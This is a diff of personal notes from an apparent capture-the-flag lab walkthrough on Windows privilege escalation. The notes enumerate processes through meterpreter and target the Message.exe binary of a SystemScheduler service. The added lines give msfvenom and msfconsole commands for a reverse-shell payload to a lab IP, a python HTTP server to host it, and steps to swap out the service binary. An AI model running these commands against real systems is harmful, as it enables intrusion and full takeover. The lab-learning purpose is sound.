@@ -113,11 +113,32 @@ msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse
 In meterpreter use the ***sysinfo*** command
 ![[Pasted image 20251018214032.png]]
 
-## Can you spot a _service_ running some automated task that could be easily exploited? What is the **name** of this service?
+# Service_ running some automated task 
 We can run the ***PS*** command inside of metepreter to list all running processes on the machine 
 ![[Pasted image 20251018214915.png]]
 Immediately, we have at one that stands out, which is the WScheduler.exe, but is that the correct answer? 
 The hint mentions to check out C:\Program Files (x86), so lets try that from the Meterpreter session 
 ![[Pasted image 20251018215108.png]]
 We have the SystemScheduler which seems weird to be in the program files, lets check it out further
+The binary that we are supposed to exploit is the "Message.exe" 
+![[Pasted image 20251018215747.png]]
+# Escalate Privileges
+All we have been told is using the above service, escalate our priveleges
+What I'm guessing is that we will have to replace that service with our own payload, then run it gaining a new shell?
 
+## Creating the PrivEsc payload
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.9.0.124 LPORT=6666 -f exe -o Message.exe
+```
+## Setup Listener
+We can either create a new one as below
+```bash
+msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.9.0.124; set lport 6666; exploit"
+```
+Or we can background the current session and setup a new listener 
+## Hosting the payload
+```
+python -m http.server 9090
+```
+## Download payload on target in the Service Folder
+1. Go to the folder of where the original Message.exe service is running and replace it
